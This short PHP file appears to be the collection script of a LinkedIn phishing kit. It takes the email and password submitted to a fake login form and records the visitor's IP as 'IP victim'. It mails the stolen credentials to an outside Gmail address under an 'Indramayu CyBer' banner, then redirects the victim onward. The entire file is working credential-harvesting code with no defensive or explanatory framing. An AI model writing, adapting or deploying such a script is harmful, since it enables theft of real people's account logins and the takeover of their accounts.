<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['login'];
$password = $_POST['password'];


$login = "Email : ".$email;
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;


$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "Linkedin Login | ".$ip;
mail("jesuswire80@gmail.com", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: continue.php?email=$email");
?>